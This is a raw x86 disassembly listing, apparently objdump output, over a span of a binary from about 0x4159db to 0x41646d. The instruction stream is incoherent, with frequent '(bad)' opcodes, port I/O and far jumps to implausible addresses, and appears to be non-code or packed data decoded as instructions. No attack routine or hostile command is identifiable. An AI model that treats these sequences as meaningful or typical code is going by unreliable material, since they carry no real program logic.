  4159db:	push   esp
  4159dc:	xor    BYTE PTR [edi+ecx*8],al
  4159df:	out    dx,al
  4159e0:	and    DWORD PTR [esi+edx*4-0x15],edi
  4159e4:	jle    0x415a41
  4159e6:	mov    esi,0xb70be997
  4159eb:	popa   
  4159ec:	or     BYTE PTR [esi-0x647c9421],cl
  4159f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159f3:	popa   
  4159f4:	(bad)  
  4159f5:	fisttp QWORD PTR [ebx+0x203f059]
  4159fb:	add    al,0x56
  4159fd:	pop    ds
  4159fe:	add    ebx,eax
  415a00:	loope  0x415a06
  415a02:	cmp    eax,0x7f03d03c
  415a07:	popa   
  415a08:	dec    edx
  415a09:	push   ebx
  415a0a:	add    BYTE PTR [ecx+0x6efd43e3],al
  415a10:	mov    ch,0xde
  415a12:	call   0x8c467975
  415a17:	dec    BYTE PTR fs:[esi+edi*8]
  415a1b:	push   esi
  415a1c:	bnd jnp 0x4159fa
  415a1f:	sar    BYTE PTR [ebx+eax*1-0x1],0x7c
  415a24:	pop    edx
  415a25:	or     eax,0x3efe
	...
  415a52:	pop    ds
  415a53:	(bad)
  415a57:	inc    ebx
  415a58:	std    
  415a59:	cs mov ch,0xde
  415a5c:	in     al,0x1e
  415a5e:	fild   WORD PTR [ebx+ebp*2]
  415a61:	jmp    0xa8a963cb
  415a66:	cmp    eax,0x731b404
  415a6b:	add    eax,0x5b7106fe
  415a70:	call   0xfe45d846
  415a75:	pusha  
  415a76:	shl    DWORD PTR [ebx],0xf6
  415a79:	out    dx,al
  415a7a:	(bad)  
  415a7c:	cmp    DWORD PTR [ecx+0x39fe0196],0x22
  415a83:	push   ebp
  415a84:	push   0x28
  415a86:	inc    edx
  415a87:	add    dh,BYTE PTR [ecx+esi*4-0x3901fe7a]
  415a8e:	lock pop edx
  415a90:	call   0xfe435886
  415a95:	pusha  
  415a96:	shr    BYTE PTR [esi],0xf6
  415a99:	scas   al,BYTE PTR es:[edi]
  415a9a:	sahf   
  415a9b:	fnstsw WORD PTR [ebx-0x1fe6967]
  415aa1:	jmp    0x54c2d0af
  415aa6:	pop    ecx
  415aa7:	or     esi,edi
  415aa9:	mov    ?,WORD PTR ds:0x64006287
  415aaf:	loope  0x415a96
  415ab1:	not    DWORD PTR [eax+0x7b]
  415ab4:	std    
  415ab5:	jae    0x415ab7
	...
  415adf:	add    BYTE PTR [esi],ch
  415ae1:	out    dx,eax
  415ae2:	std    
  415ae3:	inc    DWORD PTR [eax-0x44]
  415ae6:	(bad)  
  415ae7:	jne    0x415aa0
  415ae9:	jbe    0x415b5d
  415aeb:	cmp    DWORD PTR [eax],edx
  415aed:	jnp    0x415aed
  415aef:	mov    ch,0x7
  415af1:	mov    ds:0x28f0fffe,eax
  415af6:	push   cs
  415af7:	call   0x3ec064
  415afc:	push   eax
  415afd:	jmp    0x7b9252eb
  415b02:	(bad)  
  415b03:	jne    0x415b6c
  415b05:	jbe    0x415abf
  415b07:	cmp    DWORD PTR [eax],esp
  415b09:	jnp    0x415b09
  415b0b:	mov    ch,0x4f
  415b0d:	mov    ds:0x2950fffe,eax
  415b12:	push   cs
  415b13:	call   0x3ec014
  415b18:	inc    eax
  415b19:	jmp    0xa29252f7
  415b1e:	(bad)  
  415b1f:	mov    ch,0x3b
  415b21:	mov    ds:0x2850fffe,eax
  415b26:	push   cs
  415b27:	call   0x3ebbb8
  415b2c:	adc    ah,ah
  415b2e:	(bad)  
  415b30:	adc    BYTE PTR [edx+0x762775fe],ah
  415b36:	mov    BYTE PTR [ecx],bh
  415b38:	add    BYTE PTR [edx-0x5648427e],ah
  415b3e:	(bad)  
  415b3f:	call   DWORD PTR [edi]
  415b41:	sub    ah,BYTE PTR [ecx]
  415b43:	push   0x0
	...
  415b6c:	add    BYTE PTR [eax],al
  415b6e:	push   ss
  415b6f:	pop    esi
  415b70:	in     eax,dx
  415b71:	mov    esi,0xe80e23a0
  415b76:	neg    BYTE PTR [esi-0x3]
  415b79:	(bad)  
  415b7a:	ds jmp 0xd12b2b17
  415b80:	pop    ebp
  415b81:	(bad)  
  415b82:	xchg   ebx,eax
  415b83:	fist   WORD PTR [ebp-0x2]
  415b86:	rol    DWORD PTR [eax-0x3b29f029],1
  415b8c:	sbb    al,0xff
  415b8e:	shl    DWORD PTR [eax-0x29],0xf
  415b92:	mov    ecx,0xb1f63cde
  415b97:	mov    al,ds:0x9c36745d
  415b9c:	sub    al,0xfe
  415b9e:	mov    eax,ds:0x76b45d90
  415ba3:	inc    eax
  415ba4:	pop    ebp
  415ba5:	(bad)  
  415ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ba7:	add    ebx,DWORD PTR [esi]
  415ba9:	dec    DWORD PTR [ecx-0x761068b8]
  415baf:	xor    BYTE PTR [ebp-0x19],bl
  415bb2:	and    edi,eax
  415bb4:	pop    esi
  415bb5:	(bad)  
  415bb6:	jno    0x415b5e
  415bb8:	jo     0x415bb0
  415bba:	imul   ebp,DWORD PTR [eax+0x6c],0x5d512219
  415bc1:	(bad)  
  415bc2:	xchg   ebx,eax
  415bc3:	imul   edx,DWORD PTR [ebp-0x2],0x51
  415bc7:	imul   ecx,DWORD PTR ds:0x5f08493c,0xffffffb4
  415bce:	pop    edx
  415bcf:	or     BYTE PTR [edi-0x2],bl
	...
  415bfa:	add    BYTE PTR [eax],al
  415bfc:	es out dx,eax
  415bfe:	sbb    eax,0x992231ff
  415c03:	fbstp  TBYTE PTR [ecx]
  415c05:	sub    bl,BYTE PTR [edi-0x19]
  415c08:	daa    
  415c09:	outs   dx,BYTE PTR ds:[esi]
  415c0a:	pop    ebp
  415c0b:	(bad)  
  415c0c:	sbb    DWORD PTR [eax-0x3dee09cb],eax
  415c12:	imul   ebp,ebp,0xfe5ec945
  415c18:	jnp    0x415be4
  415c1a:	ins    BYTE PTR es:[edi],dx
  415c1b:	stc    
  415c1c:	sti    
  415c1d:	pop    ebx
  415c1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c1f:	pop    esi
  415c20:	lock xchg BYTE PTR [ebx-0x18ccc895],bl
  415c27:	add    esi,edi
  415c29:	sbb    eax,0xd47303dc
  415c2e:	xchg   ebx,eax
  415c2f:	cmp    ch,0xff
  415c32:	adc    DWORD PTR [esp+edx*2],eax
  415c35:	mov    ?,WORD PTR [esi-0x28]
  415c38:	cmp    ebx,esi
  415c3a:	out    0x1c,eax
  415c3c:	mov    ecx,0xb5c87100
  415c41:	add    ch,dl
  415c43:	or     edx,DWORD PTR [esi]
  415c45:	jg     0x415c07
  415c47:	les    esp,FWORD PTR [ecx+0x1aa1501]
  415c4d:	call   0x5e3e:0xfeb06be7
  415c54:	mov    BYTE PTR [esi+0x7205ebdf],al
  415c5a:	test   al,0x3
  415c5c:	out    0x5c,al
  415c5e:	out    0x3,eax
	...
  415c88:	add    BYTE PTR [eax],al
  415c8a:	mov    esi,0x68606cf3
  415c8f:	add    BYTE PTR [edi],dl
  415c91:	fsub   DWORD PTR [ebp+0x0]
  415c94:	xchg   ebp,eax
  415c95:	or     esp,DWORD PTR [esi+0x6c]
  415c98:	rcr    BYTE PTR [esi+0x50],0x12
  415c9c:	sub    al,BYTE PTR [edi]
  415c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca0:	bound  ebp,QWORD PTR [edi-0x44]
  415ca3:	pop    ss
  415ca4:	in     al,dx
  415ca5:	mov    ah,0x90
  415ca7:	jne    0x415c90
  415ca9:	jmp    0xc965d31
  415cae:	push   ss
  415caf:	(bad)  
  415cb0:	minps  xmm4,XMMWORD PTR [eax]
  415cb3:	shl    BYTE PTR [eax+eiz*2],cl
  415cb6:	les    eax,FWORD PTR [ebp+0x15]
  415cb9:	int3   
  415cba:	jle    0x415d17
  415cbc:	jb     0x415cdd
  415cbe:	dec    esp
  415cbf:	xchg   ebx,eax
  415cc0:	add    BYTE PTR [eax],ch
  415cc2:	cmp    bl,bl
  415cc4:	cmp    eax,0x689711e9
  415cc9:	(bad)  
  415cca:	out    0x9a,eax
  415ccc:	add    BYTE PTR [esi],dh
  415cce:	pop    edx
  415ccf:	sub    ah,BYTE PTR [esi]
  415cd1:	jmp    0x1601b113
  415cd6:	(bad)  [ebp+0xf8cfe8]
  415cdc:	(bad)  
  415cdd:	sbb    edx,ebx
  415cdf:	(bad)  
  415ce0:	std    
  415ce1:	xchg   BYTE PTR [eax+0x7d032077],ah
  415ce7:	dec    DWORD PTR [ebp+0x66]
  415cea:	mov    DWORD PTR [edi-0x18],edx
  415ced:	sbb    eax,DWORD PTR [eax]
	...
  415d17:	add    BYTE PTR [esi+0x4741fe00],dl
  415d1d:	inc    esp
  415d1e:	std    
  415d1f:	dec    esi
  415d20:	daa    
  415d21:	pop    ebx
  415d22:	inc    esi
  415d23:	imul   esi,DWORD PTR [eax],0x8043735b
  415d29:	add    esi,DWORD PTR [edx]
  415d2b:	sub    DWORD PTR [ebp+0x1b2efe00],esp
  415d31:	or     ch,BYTE PTR [edi-0x4679c51f]
  415d37:	push   ds
  415d38:	xchg   ecx,eax
  415d39:	add    edi,esi
  415d3b:	pushf  
  415d3c:	xor    eax,0xfad195f3
  415d41:	add    BYTE PTR [esi-0x59],bl
  415d44:	add    al,0x1a
  415d46:	add    eax,0xecd490e9
  415d4b:	push   0xfffffff6
  415d4d:	add    ebp,DWORD PTR [ebx-0x17]
  415d50:	daa    
  415d51:	mov    ?,ebp
  415d53:	pop    esp
  415d54:	inc    edx
  415d55:	repz aaa 
  415d57:	and    DWORD PTR [ebx-0x61d37803],ecx
  415d5d:	je     0x415d5f
  415d5f:	inc    ecx
  415d60:	or     DWORD PTR [ebp+0x3f],esi
  415d63:	add    BYTE PTR [edi],ah
  415d65:	repz sub al,0x6a
  415d68:	push   esi
  415d69:	push   edi
  415d6a:	std    
  415d6b:	xor    eax,0x4112bd
  415d70:	call   FWORD PTR [edi+0x5398ff3c]
  415d76:	shl    BYTE PTR [esi+edi*1-0x39],0x65
	...
  415da3:	add    BYTE PTR [eax],al
  415da5:	add    bh,dl
  415da7:	outs   dx,DWORD PTR ds:[esi]
  415da8:	mov    ebx,0x40f12968
  415dad:	add    BYTE PTR [edi],dh
  415daf:	mov    al,ds:0x99af0874
  415db4:	(bad)  
  415db5:	dec    DWORD PTR [eax+0x72]
  415db8:	(bad)  
  415db9:	cmp    ch,BYTE PTR [eax]
  415dbb:	lahf   
  415dbc:	add    BYTE PTR gs:[edi-0x16974491],ah
  415dc3:	hlt    
  415dc4:	inc    eax
  415dc5:	add    BYTE PTR [edi-0x3b],bh
  415dc8:	addr16 inc ecx
  415dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dcb:	lahf   
  415dcc:	je     0x415dd6
  415dce:	out    dx,eax
  415dcf:	test   eax,0x9f48ff62
  415dd4:	je     0x415dd2
  415dd6:	dec    eax
  415dd7:	and    eax,0x5f41e806
  415ddc:	std    
  415ddd:	jmp    FWORD PTR [esi]
  415ddf:	pushf  
  415de0:	add    DWORD PTR [eax],eax
  415de2:	mov    dl,0xd3
  415de4:	jmp    0x53df716c
  415de9:	push   edi
  415dea:	mov    ebp,0x38506a5a
  415def:	and    eax,0x670fe806
  415df4:	std    
  415df5:	(bad)  
  415df6:	ficom  WORD PTR [edx+edi*8]
  415df9:	mov    esi,edx
  415dfb:	das    
  415dfc:	dec    eax
  415dfd:	inc    ecx
  415dfe:	daa    
  415dff:	int    0x3c
  415e01:	xor    ch,BYTE PTR [edi+0x18]
  415e04:	(bad)  
  415e05:	jg     0x415e45
  415e07:	gs add al,0x74
	...
  415e32:	add    BYTE PTR [eax],al
  415e34:	sbb    DWORD PTR [edi+eiz*8-0x4d0b8097],0xffffffe7
  415e3c:	and    edx,DWORD PTR [esi+0x4]
  415e3f:	add    BYTE PTR ds:0x901ed0b4,dh
  415e45:	sbb    al,0x1c
  415e47:	inc    esp
  415e48:	icebp  
  415e49:	mov    ah,0xb4
  415e4b:	addr16 ds hlt 
  415e4e:	push   0xffffffbd
  415e50:	push   esi
  415e51:	pop    ebp
  415e52:	out    dx,al
  415e53:	inc    eax
  415e54:	ds inc esp
  415e56:	pop    ecx
  415e57:	je     0x415e9f
  415e59:	in     al,dx
  415e5a:	mov    edi,0x6c7cc962
  415e5f:	dec    ebp
  415e60:	add    al,0x85
  415e62:	pop    ecx
  415e63:	jmp    0x1f3e:0x3d84363f
  415e6a:	pop    esp
  415e6b:	inc    ebp
  415e6c:	stos   BYTE PTR es:[edi],al
  415e6d:	pusha  
  415e6e:	inc    esp
  415e6f:	mov    eax,0xfe59a4a1
  415e74:	mov    WORD PTR [ebp+0x1c],?
  415e77:	pop    es
  415e78:	or     ebx,ecx
  415e7a:	pop    ecx
  415e7b:	je     0x415e07
  415e7d:	cmp    al,0xcf
  415e7f:	pop    es
  415e80:	xchg   esi,eax
  415e81:	fst    DWORD PTR [ecx]
  415e83:	(bad)  
  415e84:	jns    0x415e52
  415e86:	mov    bh,0xc8
  415e88:	jl     0x415e79
  415e8a:	add    DWORD PTR [ebp-0x4b],edx
  415e8d:	dec    edi
  415e8e:	test   ebx,eax
  415e90:	bound  edi,QWORD PTR [ebp-0x25c1964e]
  415e96:	mov    ah,0xfe
	...
  415ec0:	add    BYTE PTR [eax],al
  415ec2:	retf   
  415ec3:	or     ebp,DWORD PTR [edx+0x49]
  415ec6:	adc    ebp,edi
  415ec8:	pop    edx
  415ec9:	mov    bl,bh
  415ecb:	pop    es
  415ecc:	(bad)  
  415ecd:	xor    al,0x68
  415ecf:	mov    edx,0x5bc4ffc4
  415ed4:	and    al,0x16
  415ed6:	jbe    0x415e72
  415ed8:	out    0x83,eax
  415eda:	pusha  
  415edb:	pop    ebx
  415edc:	pop    ebx
  415edd:	shl    DWORD PTR [ecx+0x11c541d8],0xa6
  415ee4:	iret   
  415ee5:	loop   0x415f4a
  415ee7:	pop    ebx
  415ee8:	out    0xe,eax
  415eea:	inc    BYTE PTR [edi-0x3f1e4e2a]
  415ef0:	sub    bl,BYTE PTR [ebx-0x10]
  415ef3:	stos   DWORD PTR es:[edi],eax
  415ef4:	(bad)  
  415ef6:	ds in  al,dx
  415ef8:	pop    ebp
  415ef9:	jmp    0x415ec5
  415efb:	jno    0x415f25
  415efd:	add    al,0x6e
  415eff:	cld    
  415f00:	adc    al,0xc
  415f02:	out    0x14,al
  415f04:	or     bl,BYTE PTR [ebx-0x38]
  415f07:	repz xchg edi,eax
  415f09:	sbb    al,0xc1
  415f0b:	cld    
  415f0c:	add    BYTE PTR [eax+eax*1],0xdb
  415f10:	lods   eax,DWORD PTR ds:[esi]
  415f11:	add    ebp,DWORD PTR [ebx]
  415f13:	add    DWORD PTR [esi-0x5ee493a9],ebp
  415f19:	pop    edx
  415f1a:	mov    al,ds:0xeb5556fc
  415f1f:	inc    ebx
  415f20:	out    0xd0,al
  415f22:	aam    0xfc
  415f24:	mov    esp,0x57
	...
  415f4d:	add    BYTE PTR [eax],al
  415f4f:	add    BYTE PTR [eax+0x556bef86],cl
  415f55:	inc    esp
  415f56:	ss pop edx
  415f58:	sbb    BYTE PTR [ebp+0x5b3d4520],bl
  415f5e:	mov    esp,0x23d8558e
  415f63:	push   edi
  415f64:	xlat   BYTE PTR ds:[ebx]
  415f65:	pop    edx
  415f66:	xor    DWORD PTR [ebp+0x6bdf8658],0x5a064583
  415f70:	mov    dh,0x96
  415f72:	sti    
  415f73:	jmp    0xfc3d:0xa80071a1
  415f7a:	jae    0x415f5d
  415f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f7d:	mov    fs,eax
  415f7f:	out    0x87,al
  415f81:	std    
  415f82:	jae    0x415f61
  415f84:	xchg   DWORD PTR [edi+0x4675c108],eax
  415f8a:	std    
  415f8b:	into   
  415f8c:	test   DWORD PTR [edx],ebx
  415f8e:	add    eax,0xecd0d8e9
  415f93:	push   0x7e
  415f95:	sbb    al,0x57
  415f97:	mov    dh,0x9
  415f99:	push   eax
  415f9a:	call   0xfe3db3c3
  415f9f:	bnd jge 0x415f29
  415fa2:	add    edi,DWORD PTR [edi]
  415fa4:	jne    0x415fc0
  415fa6:	or     ecx,ebp
  415fa8:	rcl    BYTE PTR [esi-0x7888c610],0xc
  415faf:	xchg   ecx,eax
  415fb0:	outs   dx,DWORD PTR ds:[esi]
  415fb1:	ds std 
  415fb3:	jle    0x415fb5
	...
  415fdd:	add    BYTE PTR [ebx],dh
  415fdf:	sbb    ecx,DWORD PTR [esi]
  415fe1:	ins    DWORD PTR es:[edi],dx
  415fe2:	dec    edx
  415fe3:	pop    edx
  415fe4:	add    cl,ch
  415fe6:	push   ss
  415fe7:	xchg   esp,edi
  415fe9:	push   ecx
  415fea:	call   0xb5a05d31
  415fef:	xchg   esi,eax
  415ff0:	in     al,dx
  415ff1:	push   esi
  415ff2:	mov    edi,edi
  415ff4:	std    
  415ff5:	aam    0x19
  415ff7:	std    
  415ff8:	jae    0x41603b
  415ffa:	sbb    bh,BYTE PTR [edi+esi*1+0x3e]
  415ffe:	out    0xd0,eax
  416000:	jae    0x416047
  416002:	in     eax,0xab
  416004:	add    cl,ch
  416006:	cmp    eax,0x7c922d73
  41600b:	sti    
  41600c:	push   ebx
  41600d:	adc    ecx,eax
  41600f:	ss add cl,ch
  416012:	dec    edx
  416013:	sbb    esi,DWORD PTR [esp+eiz*8-0x1c]
  416017:	mov    dh,0x0
  416019:	add    BYTE PTR [edi+0x57],dl
  41601c:	mov    eax,esi
  41601e:	scas   eax,DWORD PTR es:[edi]
  41601f:	xor    ch,BYTE PTR [ecx+0x41]
  416022:	daa    
  416023:	xchg   ebp,ebx
  416025:	and    esp,DWORD PTR [edi]
  416027:	pop    edi
  416028:	add    eax,esi
  41602a:	scas   al,BYTE PTR es:[edi]
  41602b:	sub    esi,esp
  41602d:	push   0x410848
  416032:	pop    ecx
  416033:	xchg   DWORD PTR [ebp+0x25],edi
  416036:	daa    
  416037:	pop    edi
  416038:	or     eax,eax
  41603a:	dec    edx
  41603b:	cli    
  41603c:	call   0xa077c1
  416041:	mov    al,BYTE PTR [eax]
	...
  41606b:	add    BYTE PTR [edi],dl
  41606d:	popf   
  41606e:	std    
  41606f:	call   DWORD PTR [edi-0x4f]
  416072:	(bad)  
  416073:	jne    0x416044
  416075:	xchg   BYTE PTR [ebp+0x95ed723],dh
  41607b:	sar    BYTE PTR [ebx],0xff
  41607e:	mov    BYTE PTR [ebp-0x45],al
  416081:	xchg   ebx,eax
  416082:	je     0x41606c
  416084:	scas   eax,DWORD PTR es:[edi]
  416085:	imul   eax,DWORD PTR [ebp-0x1],0x40
  416089:	in     eax,0x44
  41608b:	loopne 0x4160bd
  41608d:	sub    edx,esp
  41608f:	jmp    FWORD PTR [edx-0x11861a82]
  416095:	xchg   ebx,eax
  416096:	dec    BYTE PTR [ebx]
  416098:	push   edi
  416099:	sub    bh,BYTE PTR [ebx]
  41609b:	rol    DWORD PTR [edx-0xdff9866],1
  4160a1:	mov    eax,0x290050e1
  4160a6:	fsubp  st(0),st
  4160a8:	xor    al,BYTE PTR [ecx]
  4160aa:	(bad)  
  4160ab:	call   FWORD PTR [esi+ebx*4+0x71]
  4160af:	es jg  0x41610f
  4160b2:	add    bh,ch
  4160b4:	loope  0x416048
  4160b6:	je     0x4160c0
  4160b8:	dec    edi
  4160b9:	scas   al,BYTE PTR es:[edi]
  4160ba:	xor    al,0xff
  4160bc:	ds push ecx
  4160be:	pop    eax
  4160bf:	je     0x416127
  4160c1:	imul   ecx,esi,0xea95607
  4160c7:	inc    DWORD PTR [ecx-0x7]
  4160ca:	retf   
  4160cb:	jecxz  0x416106
  4160cd:	ja     0x416130
  4160cf:	inc    BYTE PTR [eax]
	...
  4160f9:	add    BYTE PTR [ebx+0x736c69fc],ch
  4160ff:	add    DWORD PTR [esi-0x2],edx
  416102:	stos   DWORD PTR es:[edi],eax
  416103:	and    al,0x6d
  416105:	jge    0x41615d
  416107:	adc    DWORD PTR [esi+0x59],edx
  41610a:	jbe    0x416188
  41610c:	hlt    
  41610d:	jg     0x416157
  41610f:	add    al,0x7
  416111:	test   DWORD PTR [ecx-0x47],edi
  416114:	push   ebp
  416115:	(bad)  
  416116:	pushw  es
  416118:	add    ch,bh
  41611a:	mov    al,0xc8
  41611c:	iret   
  41611d:	pop    es
  41611e:	(bad)  
  41611f:	not    BYTE PTR [eax]
  416121:	jmp    ecx
  416123:	fmul   st,st(7)
  416125:	sti    
  416126:	fst    DWORD PTR [esi+0x68]
  416129:	dec    BYTE PTR [ebx-0x4]
  41612c:	imul   edi,DWORD PTR [ebx+edx*1],0x4bfe55e1
  416133:	call   0x71b7aea4
  416138:	push   ebp
  416139:	mov    ebx,?
  41613b:	jae    0x4160f1
  41613d:	out    0x2b,eax
  41613f:	inc    edx
  416140:	push   ebp
  416141:	(bad)  
  416142:	xchg   ebp,eax
  416143:	add    esi,DWORD PTR [eax+ecx*8+0x5501fb7c]
  41614a:	lds    esi,FWORD PTR [edi]
  41614c:	add    ebx,0xfbbf6ea2
  416152:	out    dx,al
  416153:	cmp    bh,cl
  416155:	or     edi,DWORD PTR [ecx-0x4a]
  416158:	or     eax,ebp
  41615a:	adc    eax,0x460
	...
  416187:	add    BYTE PTR ds:0xbb07275b,dh
  41618d:	inc    edx
  41618e:	call   0xe7c69f96
  416193:	jmp    0x4161d9
  416195:	xchg   BYTE PTR [eax-0xc90b6fd],ch
  41619b:	push   esi
  41619c:	retf   0xf62
  41619f:	pop    ds
  4161a0:	jne    0x41619a
  4161a2:	test   BYTE PTR [edx+edi*2-0x69fc7e0d],0x4b
  4161aa:	push   edx
  4161ab:	lds    esp,FWORD PTR [ecx]
  4161ad:	cli    
  4161ae:	push   esp
  4161af:	or     BYTE PTR [ecx],bl
  4161b1:	outs   dx,DWORD PTR ds:[esi]
  4161b2:	fild   QWORD PTR [ebx+0x2f]
  4161b5:	xor    al,0xce
  4161b7:	push   esi
  4161b8:	mov    dh,0x9e
  4161ba:	mov    ebx,0x17ff7a88
  4161bf:	in     al,dx
  4161c0:	push   eax
  4161c1:	test   BYTE PTR [eax],ch
  4161c3:	add    al,0xf1
  4161c5:	outs   dx,BYTE PTR ds:[esi]
  4161c6:	fist   DWORD PTR [esi+0x72]
  4161c9:	arpl   WORD PTR [edi-0x6107d8a6],cx
  4161cf:	mov    WORD PTR [edx+0x660401eb],es
  4161d5:	pop    ecx
  4161d6:	add    al,ch
  4161d8:	leave  
  4161d9:	stc    
  4161da:	cld    
  4161db:	pop    es
  4161dc:	shr    DWORD PTR [esi-0x11],0x6b
  4161e0:	mov    ds:0xc6567635,eax
  4161e5:	sahf   
  4161e6:	jnp    0x4161d1
  4161e8:	test   eax,0xeb0a80
	...
  416215:	add    dh,bh
  416217:	pop    edx
  416218:	pop    esi
  416219:	rol    BYTE PTR [ebp-0x8],1
  41621c:	fmul   QWORD PTR [ebx]
  41621e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41621f:	or     dl,BYTE PTR [edx]
  416221:	push   edi
  416222:	mov    dl,ah
  416224:	lods   al,BYTE PTR ds:[esi]
  416225:	imul   edi,DWORD PTR [esi+esi*2-0x20b6fcc9],0x0
  41622d:	push   0x3d
  41622f:	pop    ebx
  416230:	add    BYTE PTR [edx-0x7a],ch
  416233:	cld    
  416234:	add    BYTE PTR [ebp+0x573f986],bl
  41623a:	lock outs dx,BYTE PTR ds:[esi]
  41623c:	lock add DWORD PTR [eax-0x60],edi
  416240:	std    
  416241:	push   cs
  416242:	xor    al,0x1b
  416244:	jne    0x4161dd
  416246:	or     al,BYTE PTR [edi-0x19c26c1c]
  41624c:	inc    ebx
  41624d:	or     eax,0xf973f8ed
  416252:	xchg   esp,eax
  416253:	pop    ebp
  416254:	pop    edi
  416255:	out    0x8b,al
  416257:	rcl    BYTE PTR gs:[ebp-0x2b],0xdc
  41625c:	jnp    0x41622f
  41625e:	cmp    ch,BYTE PTR [edi+0x51]
  416261:	push   0xfffffff1
  416263:	jmp    0x416265
  416265:	cmp    eax,0xb97bdcf9
  41626a:	inc    edx
  41626b:	outs   dx,DWORD PTR ds:[esi]
  41626c:	inc    ebp
  41626d:	inc    ecx
  41626e:	cmp    bl,BYTE PTR [ebx-0x13]
  416271:	outs   dx,DWORD PTR ds:[esi]
  416272:	xchg   ebx,eax
  416273:	outs   dx,DWORD PTR ds:[esi]
  416274:	adc    BYTE PTR [ecx-0x6102d412],dl
	...
  4162a2:	add    BYTE PTR [eax],al
  4162a4:	jae    0x416315
  4162a6:	clc    
  4162a7:	xchg   esi,eax
  4162a8:	add    DWORD PTR [eax-0x18],ebp
  4162ab:	add    ch,BYTE PTR [esi]
  4162ad:	clc    
  4162ae:	std    
  4162af:	xchg   cl,dh
  4162b1:	jmp    0x4162b0
  4162b3:	hlt    
  4162b4:	lods   eax,DWORD PTR ds:[esi]
  4162b5:	jmp    DWORD PTR [eax-0x43]
  4162b8:	or     bh,cl
  4162ba:	std    
  4162bb:	hlt    
  4162bc:	or     ecx,edi
  4162be:	jae    0x416319
  4162c0:	or     ebp,DWORD PTR [edi+0x10]
  4162c3:	push   ecx
  4162c4:	cmp    BYTE PTR [edi],ch
  4162c6:	std    
  4162c7:	push   esi
  4162c8:	jmp    0x416338
  4162ca:	in     al,dx
  4162cb:	dec    esi
  4162cc:	jns    0x416335
  4162ce:	call   0xfda932d3
  4162d3:	(bad)  
  4162d4:	cmp    BYTE PTR [eax],ch
  4162d6:	out    0xff,al
  4162d8:	mov    dl,0xeb
  4162da:	in     eax,0x3c
  4162dc:	jae    0x41626c
  4162de:	(bad)  
  4162df:	inc    edx
  4162e1:	xchg   ebx,eax
  4162e2:	in     eax,0x21
  4162e4:	jo     0x416274
  4162e6:	(bad)  
  4162e7:	push   DWORD PTR [edx+0x7019e5a7]
  4162ed:	mov    ?,esi
  4162ef:	inc    edx
  4162f1:	mov    esp,ebp
  4162f3:	adc    eax,esi
  4162f5:	(bad)  
  4162f6:	(bad)  
  4162f7:	push   DWORD PTR [edx-0xff61a82]
  4162fd:	(bad)  
  4162fe:	(bad)  
  4162ff:	inc    DWORD PTR [edx+0x3001e587]
  416305:	nop
  416306:	(bad)  
  416307:	inc    DWORD PTR [eax]
	...
  416331:	add    BYTE PTR [edx-0x6d],dh
  416334:	in     eax,0x25
  416336:	xor    al,0x5f
  416338:	add    cl,cl
  41633a:	aad    0x5e
  41633c:	add    BYTE PTR [ebp+0x6c],dl
  41633f:	jle    0x4162c1
  416341:	(bad)  
  416342:	jmp    DWORD PTR [edi-0x4a750002]
  416348:	stc    
  416349:	push   eax
  41634a:	cwde   
  41634b:	and    eax,0x6732ff0a
  416350:	call   0x9c6764
  416355:	or     edx,DWORD PTR [edi-0x285a7ca1]
  41635b:	pop    edx
  41635c:	add    bh,al
  41635e:	bound  edx,QWORD PTR [edi+0x5aa7fffd]
  416364:	lds    eax,FWORD PTR [ebp+0x33]
  416367:	pop    DWORD PTR [esi]
  416369:	add    BYTE PTR [edi-0x589601fc],dl
  41636f:	fld    QWORD PTR [esp+ebp*8-0x1ab6ac2]
  416376:	out    dx,al
  416377:	sbb    DWORD PTR [edx],eax
  416379:	(bad)  
  41637a:	sti    
  41637b:	aaa    
  41637c:	mov    cl,0x8c
  41637e:	ret    
  41637f:	xor    BYTE PTR [esi+edi*8+0x71],cl
  416383:	aam    0x54
  416385:	je     0x4163ed
  416387:	inc    ebp
  416388:	into   
  416389:	sti    
  41638a:	push   esi
  41638b:	cmp    bl,BYTE PTR [edi]
  41638d:	add    BYTE PTR [esi],bh
  41638f:	jmp    0x597dd6d5
  416394:	fild   DWORD PTR [edx+0x0]
	...
  4163be:	add    BYTE PTR [eax],al
  4163c0:	mov    edi,eax
  4163c2:	dec    ecx
  4163c3:	inc    BYTE PTR [ecx+0x3]
  4163c6:	into   
  4163c7:	add    al,0x39
  4163c9:	mov    edi,0x7efcea59
  4163ce:	jle    0x4163b7
  4163d0:	xor    DWORD PTR ds:0x86b34f52,eax
  4163d6:	pop    eax
  4163d7:	neg    BYTE PTR [ecx]
  4163d9:	adc    eax,0x8bfeb5
  4163de:	push   ebx
  4163df:	je     0x416417
  4163e1:	sbb    al,0x82
  4163e3:	cmp    BYTE PTR [ecx],al
  4163e5:	sbb    eax,0xf172bffe
  4163ea:	jl     0x416370
  4163ec:	out    dx,al
  4163ed:	mov    ah,0x51
  4163ef:	(bad)  
  4163f0:	push   esi
  4163f1:	pop    edx
  4163f2:	fld    QWORD PTR [eax+0x3e]
  4163f5:	mov    ebp,0xd4d1ef97
  4163fa:	push   ecx
  4163fb:	out    0xef,eax
  4163fd:	and    DWORD PTR [edx],eax
  4163ff:	add    BYTE PTR ds:0xc10dd8c4,dh
  416405:	ss push esp
  416407:	idiv   BYTE PTR [ecx+0x4e745174]
  41640d:	fdivr  QWORD PTR [eax]
  41640f:	sti    
  416410:	test   eax,0xaeb45184
  416415:	pop    edx
  416416:	pop    esi
  416417:	push   ebx
  416418:	cwde   
  416419:	add    ch,BYTE PTR [eax+0x56f59119]
  41641f:	leave  
  416420:	xchg   ecx,eax
  416421:	add    eax,edx
  416423:	push   edx
	...
  41644c:	add    BYTE PTR [eax],al
  41644e:	xor    ch,0x46
  416451:	fnstenv [ebp+0x2]
  416454:	pushf  
  416455:	and    eax,0x46205b3e
  41645a:	xor    eax,0x557e945b
  41645f:	fldcw  WORD PTR [ebx]
  416461:	push   eax
  416462:	out    0x5a,eax
  416464:	xchg   ecx,eax
  416465:	mov    dh,0x50
  416467:	outs   dx,DWORD PTR ds:[esi]
  416468:	fistp  WORD PTR [ebx-0x11]
  41646b:	sub    DWORD PTR [esi],ecx
  41646d:	push   ebx
